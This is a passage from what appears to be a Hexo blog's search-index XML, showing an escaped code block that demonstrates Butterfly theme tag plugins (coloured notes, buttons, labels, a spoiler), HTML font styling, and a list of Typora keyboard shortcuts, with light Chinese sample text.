class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;</span><br><span class="line">我爱计算机</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;</span><br><span class="line">翻车力</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;</span><br><span class="line">小风车呼啦呼啦</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;</span><br><span class="line">你是刷 Visa 还是 UnionPay</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;</span><br><span class="line">剪刀石头布</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;</span><br><span class="line">百度一下</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">‘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">你是谁？ &#123;% hideInline &quot;我去，初音未来&quot;,查看答案,#39c5bb,#fff %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% btn &#x27;https://randolfluo.github.io/&#x27;,RandolfluoBlog,far fa-hand-point-right,purple larger %&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">&#123;% label 我爱你 blue %&#125;</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">&#123;% label 颜色可选default/blue/pink/red/purple/orange/green  green %&#125;</span><br><span class="line"></span><br><span class="line">![image-20231116230956472](../../img/image-20231116230956472.png)</span><br><span class="line"></span><br><span class="line">&lt;font face=&quot;逐浪新宋&quot;&gt;我是逐浪新宋&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪圆体&quot;&gt;我是逐浪圆体&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪花体&quot;&gt;我是逐浪花体&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪像素字&quot;&gt;我是逐浪像素字&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪立楷&quot;&gt;我是逐浪立楷&lt;/font&gt;</span><br><span class="line">&lt;font color=red&gt;我是红色&lt;/font&gt;</span><br><span class="line">&lt;font color=#008000&gt;我是绿色&lt;/font&gt;</span><br><span class="line">&lt;font color=yellow&gt;我是黄色&lt;/font&gt;</span><br><span class="line">&lt;font color=Blue&gt;我是蓝色&lt;/font&gt;</span><br><span class="line">&lt;font color= #871F78&gt;我是紫色&lt;/font&gt;</span><br><span class="line">&lt;font color= #DCDCDC&gt;我是浅灰色&lt;/font&gt;</span><br><span class="line">&lt;font size=5&gt;我是尺寸&lt;/font&gt;</span><br><span class="line">&lt;font size=10&gt;我是尺寸&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪立楷&quot; color=green size=10&gt;我是逐浪立楷，绿色，尺寸为5&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">加粗： Ctrl + B</span><br><span class="line">撤销： Ctrl + Z</span><br><span class="line">字体倾斜 ：Ctrl+I</span><br><span class="line">下划线：Ctrl+U</span><br><span class="line">多级标题： Ctrl + 1~6</span><br><span class="line">有序列表：Ctrl + Shift + [</span><br><span class="line">无序列表：Ctrl + Shift + ]</span><br><span class="line">降级快捷键 ：Tab</span><br><span class="line">升级快捷键：Shift + Tab</span><br><span class="line">插入链接： Ctrl + K</span><br><span class="line">插入公式： Ctrl + Shift + M</span><br><span class="line">行内代码： Ctrl + Shift + K</span><br><span class="line">插入图片： Ctrl + Shift + I</span><br><span class="line">返回Typora顶部：Ctrl+Home</span><br><span class="line">返回Typora底部 ：Ctrl+End</span><br><span class="line">创建表格 ：Ctrl+T</span><br><span class="line">选中某句话 ：Ctrl+L</span><br><span class="line">选中某个单词 ：Ctrl+D</span><br><span class="line">选中相同格式的文字 ：Ctrl+E</span><br><span class="line">搜索: Ctrl+F</span><br><span class="line">搜索并替换 ：Ctrl+H</span><br><span class="line">删除线 ：Alt+Shift+5</span><br><span class="line">引用 ：Ctrl+Shift+Q</span><br><span class="line">生成目录：[TOC]+Enter</span><br><span class="line"></span><br><span class="line">&lt;font face=&quot;逐浪新宋&quot;&gt;我是逐浪新宋&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪圆体&quot;&gt;我是逐浪圆体&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪花体&quot;&gt;我是逐浪花体&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪像素字&quot;&gt;我是逐浪像素字&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;逐浪立楷&quot;&gt;我是逐浪立楷&lt;/font&gt;</span><br><span class="line">&lt;font color=red&gt;我是红色&lt;/font&gt;</span><br><span class="line">&lt;font color=#008000&gt;我是绿色&lt;/font&gt;</span><br><span class="line">&lt;font color=yellow&gt;我是黄色&lt;/font&gt;</span><br><span class="line">&lt;font color=Blue&gt;我是蓝色&lt;/font&gt;</span><br><span class="line">&lt;font color= #871F78&gt;我是紫色&lt;/font&gt;</span><br><span class="line">&lt;font color= #DCDCDC&gt;我是浅灰色&lt;/font&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
